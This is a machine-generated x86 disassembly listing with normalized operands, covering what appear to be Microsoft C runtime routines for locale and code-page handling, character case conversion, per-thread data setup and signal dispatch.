call sub_10041746
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_100417cd
push ebp
mov ebp esp
push esi
call sub_100417ba
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_10041801
pop ecx
mov esi eax
call sub_100417ee
mov [ eax ] esi
pop esi
pop ebp
retn
sub_10041801
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_10041842
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
push ebx
push esi
inc ecx
push edi
mov eax ecx
[ edx ] eax
mov esi [ edx + 0x78 ]
test esi esi
je r-xdata
mov esi [ edx + 0x80 ]
test esi esi
je r-xdata
mov eax ecx
[ esi ] eax
mov esi [ edx + 0x7c ]
test esi esi
je r-xdata
mov eax ecx
[ esi ] eax
mov esi [ edx + 0x88 ]
test esi esi
je r-xdata
mov eax ecx
[ esi ] eax
push 0x6
lea esi [ edx + 0x1c ]
pop ebx
mov eax ecx
[ esi ] eax
cmp [ esi - 0xc ] 0x0
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
add esi 0x10
dec ebx
jne r-xdata
mov edi [ esi - 0x4 ]
test edi edi
je r-xdata
mov eax ecx
[ edi ] eax
cmp [ esi - 0x8 ] rw-data
je r-xdata
mov eax [ edx + 0x9c ]
add eax 0xb0
[ eax ] ecx
inc ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ecx
[ edi ] eax
sub_100418d7
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov eax [ esi + 0x84 ]
test eax eax
je r-xdata
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x9c ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
mov [ ebp + 0x8 ] eax
lea edi [ esi + 0x1c ]
cmp [ eax + 0xb0 ] ebx
jne r-xdata
mov eax [ esi + 0x8c ]
sub eax 0xfe
push eax
call sub_1003f3e3
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_1003f3e3
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_1003f3e3
push [ esi + 0x88 ]
call sub_1003f3e3
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_10046fe8
push [ esi + 0x9c ]
call sub_1003f3e3
pop ecx
pop ecx
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
add ebx 0x4
add edi 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_1003f3e3
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_1003f3e3
push [ ebx ]
call sub_1003f3e3
pop ecx
pop ecx
push [ esi + 0x78 ]
call sub_1003f3e3
push [ esi + 0x84 ]
call sub_1003f3e3
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1003f3e3
push [ esi + 0x84 ]
call sub_10046e85
pop ecx
pop ecx
push eax
call sub_1003f3e3
pop ecx
push eax
call sub_1003f3e3
push [ esi + 0x84 ]
call sub_10046f81
pop ecx
pop ecx
sub_10041a31
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
mov eax edx
pop ebp
retn
push ebx
push esi
or esi 0xffffffff
push edi
mov eax esi
[ edx ] eax
mov ecx [ edx + 0x78 ]
test ecx ecx
je r-xdata
mov ecx [ edx + 0x80 ]
test ecx ecx
je r-xdata
mov eax esi
[ ecx ] eax
mov ecx [ edx + 0x7c ]
test ecx ecx
je r-xdata
mov eax esi
[ ecx ] eax
mov ecx [ edx + 0x88 ]
test ecx ecx
je r-xdata
mov eax esi
[ ecx ] eax
push 0x6
lea ecx [ edx + 0x1c ]
pop ebx
mov eax esi
[ ecx ] eax
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov edi [ ecx ]
test edi edi
je r-xdata
add ecx 0x10
dec ebx
jne r-xdata
mov edi [ ecx - 0x4 ]
test edi edi
je r-xdata
mov eax esi
[ edi ] eax
cmp [ ecx - 0x8 ] rw-data
je r-xdata
mov ecx [ edx + 0x9c ]
add ecx 0xb0
[ ecx ] esi
dec esi
pop edi
pop esi
pop ebx
mov eax esi
[ edi ] eax
sub_10041ad1
push 0xc
push r--data
call sub_1003f180
and [ ebp - 0x1c ] 0x0
call sub_100424a8
mov esi eax
mov ecx [ rw-data ]
test [ esi + 0x70 ] ecx
je r-xdata
push 0xc
call sub_10045009
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ esi + 0x6c ]
push eax
call sub_10041b51
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10041b48
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_100424a8
mov esi [ eax + 0x6c ]
mov eax esi
call sub_1003f1c5
retn
push 0x20
call sub_1003edd7
sub_10041b51
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_10041842
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_10041a31
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_100418d7
pop ecx
sub_10041bba
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
dec eax
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_10041bf4
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_1003cf9b
and [ rw-data ] 0x0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x4 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10041c62
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_10045ec0
mov [ ebx + 0x4 ] edi
xor eax eax
mov [ ebx + 0x8 ] edi
add esp 0xc
mov [ ebx + 0x21c ] edi
mov ecx 0x101
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
sub edi ebx
mov al [ edi + esi ]
mov [ esi ] al
inc esi
dec ecx
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10041cc1
push ebp
mov ebp esp
sub esp 0x520
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x518 ]
push edi
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
mov ecx ebx
pop eax
sub eax edx
mov [ ebp - 0x520 ] eax
mov eax ebx
cmp [ ebp - 0x51c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
lea ecx [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
jmp r-xdata
mov [ edx ] bl
lea eax [ esi + ecx ]
or [ eax + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x51c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x520 ]
lea edx [ esi + 0x119 ]
inc ecx
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x504 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_100476aa
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_1004756c
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_1004756c
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x504 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_10041e53
push 0xc
push r--data
call sub_1003f180
xor esi esi
mov [ ebp - 0x1c ] esi
call sub_100424a8
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x70 ] ecx
je r-xdata
push 0xd
call sub_10045009
pop ecx
mov [ ebp - 0x4 ] esi
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10041ef0
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
xor eax eax
inc eax
[ esi ] eax
or eax 0xffffffff
[ esi ] eax
jne r-xdata
mov eax esi
call sub_1003f1c5
retn
push 0x20
call sub_1003edd7
cmp esi rw-data
je r-xdata
push esi
call sub_1003f3e3
pop ecx
sub_10041ef9
push 0x10
push r--data
call sub_1003f180
or edi 0xffffffff
call sub_100424a8
mov ebx eax
mov [ ebp - 0x20 ] ebx
call sub_10041e53
mov esi [ ebx + 0x68 ]
push [ ebp + 0x8 ]
call sub_10041bf4
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
push 0x220
call sub_1003f0e4
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
call sub_1003f1c5
retn
mov ecx 0x88
mov eax [ ebp - 0x20 ]
mov esi [ eax + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
xor esi esi
mov [ ebx ] esi
push ebx
push [ ebp + 0x8 ]
call sub_100420a1
pop ecx
pop ecx
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x68 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ eax + 0x68 ] ebx
xor eax eax
inc eax
[ ebx ] eax
mov eax [ ebp - 0x20 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov ecx [ eax + 0x68 ]
cmp ecx rw-data
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_1003f3e3
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push ecx
call sub_1003f3e3
pop ecx
mov eax [ ebp - 0x20 ]
push 0xd
call sub_10045009
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x21c ]
mov [ rw-data ] eax
mov ecx esi
mov ecx esi
mov ax [ ebx + ecx * 2 + 0xc ]
mov [ ecx * 2 + rw-data ] ax
inc ecx
jmp r-xdata
mov [ ebp - 0x1c ] esi
cmp esi 0x100
jge r-xdata
mov al [ ecx + ebx + 0x18 ]
mov [ ecx + rw-data ] al
inc ecx
jmp r-xdata
mov [ ebp - 0x1c ] ecx
cmp ecx 0x5
jge r-xdata
mov eax [ rw-data ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov al [ esi + ebx + 0x119 ]
mov [ esi + rw-data ] al
inc esi
jmp r-xdata
mov [ ebp - 0x1c ] ecx
cmp ecx 0x101
jge r-xdata
mov [ rw-data ] ebx
xor eax eax
inc eax
[ ebx ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004206b
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_1003f3e3
pop ecx
sub_100420a1
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_10041bf4
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov eax edi
mov [ ebp - 0x1c ] ecx
push esi
call sub_10041c62
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_10045ec0
add esp 0xc
imul eax [ ebp - 0x1c ] 0x30
mov [ ebp - 0x20 ] eax
lea eax [ eax + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_10041bba
add esp 0x4
mov [ esi + 0x21c ] eax
mov eax [ ebp - 0x20 ]
lea ecx [ esi + 0xc ]
push 0x6
lea edx [ eax + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx edx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
lea edx [ edx + 0x2 ]
mov [ ecx ] ax
lea ecx [ ecx + 0x2 ]
dec edi
jne r-xdata
push esi
call sub_10041cc1
cmp edx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + edx + 0x19 ] al
inc edx
movzx eax [ ecx + 0x1 ]
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_10045ec0
mov [ esi + 0x4 ] ebx
add esp 0xc
xor ebx ebx
mov [ esi + 0x21c ] edi
inc ebx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_10041c62
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov cl [ eax + 0x1 ]
test cl cl
je r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
push [ esi + 0x4 ]
call sub_10041bba
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx edx cl
movzx ecx [ eax ]
jmp r-xdata
xor eax eax
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_1004228c
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
mov esp ebp
pop ebp
retn
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_1003cf9b
mov esi [ ebp - 0x14 ]
mov eax [ esi + 0xa8 ]
test eax eax
jne r-xdata
mov edx 0x100
push 0x1
cmp [ ebp + 0x8 ] dx
jae r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp ax 0x19
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_10047740
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_100476ea
pop ecx
test eax eax
mov eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
movzx eax cx
jmp r-xdata
add cx 0x20
movzx eax [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
movzx ecx ax
mov eax [ esi + 0x94 ]
movzx eax [ eax + ecx ]
jmp r-xdata
movzx eax ax
movzx eax ax
jmp r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
pop esi
je r-xdata
movzx eax ax
movzx eax ax
jmp r-xdata
sub_1004233d
push 0x8
push r--data
call sub_1003f180
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1003f1c5
retn 0x4
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x2c ] 0x0
je r-xdata
push [ esi + 0x24 ]
call sub_1003f3e3
pop ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x2c ]
call sub_1003f3e3
pop ecx
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0x34 ]
call sub_1003f3e3
pop ecx
cmp [ esi + 0x40 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call sub_1003f3e3
pop ecx
cmp [ esi + 0x44 ] 0x0
je r-xdata
push [ esi + 0x40 ]
call sub_1003f3e3
pop ecx
cmp [ esi + 0x48 ] 0x0
je r-xdata
push [ esi + 0x44 ]
call sub_1003f3e3
pop ecx
cmp [ esi + 0x5c ] r--data
je r-xdata
push [ esi + 0x48 ]
call sub_1003f3e3
pop ecx
push 0xd
call sub_10045009
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
push [ esi + 0x5c ]
call sub_1003f3e3
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004245d
push 0xc
call sub_10045009
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10042469
push esi
call sub_1003f3e3
pop ecx
push edi
call sub_10041a31
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp ecx rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push ecx
call sub_1003f3e3
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_100418d7
pop ecx
sub_10042472
push ebp
mov ebp esp
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x0
push eax
call sub_100431d7
pop ecx
pop ecx
push esi
call sub_1004233d
pop esi
push eax
call sub_100431b8
mov esi eax
mov eax [ rw-data ]
pop ecx
sub_100424c0
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_100431b8
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x3bc
push 0x1
call sub_1003f09c
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
call sub_100431d7
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_1003f3e3
pop ecx
xor esi esi
push 0x0
push esi
call sub_1004252f
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1004252f
push 0x8
push r--data
call sub_1003f180
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
push 0x43
pop eax
mov [ esi + 0xb8 ] ax
mov [ esi + 0x1be ] ax
mov [ esi + 0x68 ] rw-data
and [ esi + 0x3b8 ] 0x0
push 0xd
call sub_10045009
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x68 ]
mov ecx edi
[ eax ] ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100425d0
push 0xc
call sub_10045009
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_10041842
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100425d9
call sub_1003f1c5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_100425e2
call sub_1003ee9a
call sub_1004513a
test eax eax
jne r-xdata
push sub_1004233d
call sub_1004317b
mov [ rw-data ] eax
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_10042658
xor eax eax
retn
push esi
push 0x3bc
push 0x1
call sub_1003f09c
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_10042658
xor eax eax
pop esi
retn
push esi
push [ rw-data ]
call sub_100431d7
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push esi
call sub_1004252f
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
pop esi
retn
sub_10042675
push 0x8
push r--data
call sub_1003f180
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_1003f1c5
retn
push 0xc
call sub_10045009
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_10041b51
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100426be
sub_100426d0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_10042731
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push edi
push [ ebp + 0xc ]
call sub_1003cf9b
mov ebx [ ebp + 0x8 ]
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x74 ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
call sub_100417ee
xor ecx ecx
inc ecx
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
mov eax ebx
lea ecx [ ebp - 0x18 ]
sar eax 0x8
mov [ ebp + 0x8 ] eax
push ecx
movzx eax al
push eax
call sub_10046c47
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0x90 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_10047865
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
mov eax [ ecx + 0x94 ]
movzx ecx [ eax + ebx ]
je r-xdata
test eax eax
je r-xdata
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x8 ]
push 0x1
push [ eax + 0x4 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push edi
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1004756c
add esp 0x24
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax edx
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10042874
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10042731
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp eax 0x19
ja r-xdata
mov eax ecx
pop ebp
retn
add ecx 0x20
sub_100428a0
push ebp
mov ebp esp
push esi
call sub_100424c0
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ esi + 0x5c ]
mov ecx edx
push edi
mov edi [ ebp + 0x8 ]
lea eax [ edx + 0x90 ]
cmp ecx eax
jae r-xdata
add ecx 0xc
lea eax [ edx + 0x90 ]
cmp ecx eax
jb r-xdata
xor ecx ecx
cmp [ ecx ] edi
je r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
test ecx ecx
je r-xdata
cmp edx 0x5
jne r-xdata
cmp edx 0x1
jne r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
push [ ecx + 0x4 ]
and [ ecx + 0x8 ] 0x0
call edx
push 0x24
pop edi
mov eax [ esi + 0x5c ]
and [ edi + eax + 0x8 ] 0x0
add edi 0xc
cmp edi 0x90
jl r-xdata
cmp [ ecx ] 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
